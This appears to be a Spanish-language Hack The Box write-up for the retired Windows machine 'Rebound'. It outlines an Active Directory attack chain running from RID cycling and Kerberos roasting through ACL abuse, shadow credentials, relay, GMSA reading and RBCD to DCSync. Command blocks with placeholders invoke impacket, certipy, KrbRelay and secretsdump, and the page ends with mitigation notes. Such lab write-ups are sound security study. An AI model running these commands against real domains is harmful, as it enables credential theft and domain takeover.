---
machine: Rebound
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, active-directory, kerberos, acl, gmsa, rbcd, relay]
---

# Rebound — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Dominio de Active Directory con RID cycling para enumerar usuarios. La combinación de AS-REP roasting y Kerberoasting crackea una cuenta de servicio; una ACL permite cambiar la contraseña o crear shadow credentials. RemotePotato0 y KrbRelay dan el siguiente hash, se lee la contraseña GMSA y se encadena delegación restringida con RBCD hasta DCSync.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <IP>
```

- Puertos: DNS, Kerberos, LDAP, SMB, WinRM y servicios de AD.
- Servicios: Controlador de dominio y estaciones Windows unidas al dominio.
- Tecnologías: Active Directory, Kerberos, ACL, GMSA, delegación y RBCD.

## Enumeración

- Dominio `<DOMAIN>` y DC `<DC>`.
- Enumeración de usuarios por RID cycling.
- Cuentas sin preautenticación y SPNs Kerberoastables.
- ACLs débiles sobre grupos y usuarios.

## Foothold

Se obtiene una lista de usuarios y se lanzan AS-REP roasting y Kerberoasting. El hash crackeado pertenece a una cuenta de servicio cuya contraseña comparte un usuario de dominio; una ACL permite tomar control de una cuenta con WinRM.

```bash
netexec smb <DC> -u guest -p '' --rid-brute
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC> -usersfile users.txt -format hashcat
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Movimiento lateral

Con la ACL se cambia la contraseña o se añade una shadow credential a otra cuenta. RemotePotato0 y KrbRelay capturan el hash de la sesión siguiente; ese usuario puede leer la contraseña GMSA de una cuenta de servicio.

## Escalada de privilegios

La cuenta de servicio tiene delegación restringida. Se abusa de ella y se combina con RBCD para obtener un ticket como la cuenta de máquina del DC y ejecutar DCSync.

```bash
certipy shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account <TARGET>
RemotePotato0.exe -r <ATTACKER> -s <SESSION>
KrbRelay.exe -spn ldap/<DC> -clsid <CLSID> -rbcd <TARGET>
gMSADumper.py -u <USER> -p '<PASS>' -d <DOMAIN>
impacket-getST -spn cifs/<DC> -impersonate '<DC>$' <DOMAIN>/<USER>:<PASS>
secretsdump.py -k -no-pass <DOMAIN>/<DC>$@<DC>
```

## Evidencia

- Usuarios enumerados por RID cycling.
- Hashes AS-REP/TGS crackeados y shadow credential creada.
- Ticket de la cuenta de máquina y volcado DCSync.

## Lecciones aprendidas

- AD encadena fallos pequeños: una ACL, un SPN y una delegación mal configurada.
- Las contraseñas GMSA no son inmunes si se puede leer el objeto.
- RBCD y la delegación restringida deben auditarse juntas.

## Mitigación y detección

- Revisar ACLs, SPNs y cuentas sin preautenticación.
- Limitar la delegación y proteger los objetos GMSA.
- Monitorizar RID cycling, Kerberoasting y cambios de shadow credentials.

## Referencias

- [0xdf — Rebound](https://0xdf.gitlab.io/2024/03/30/htb-rebound.html)
- [IppSec — Rebound](https://www.youtube.com/watch?v=oUIoH4yBT3k)
- [Hack The Box — Rebound](https://app.hackthebox.com/machines/rebound)
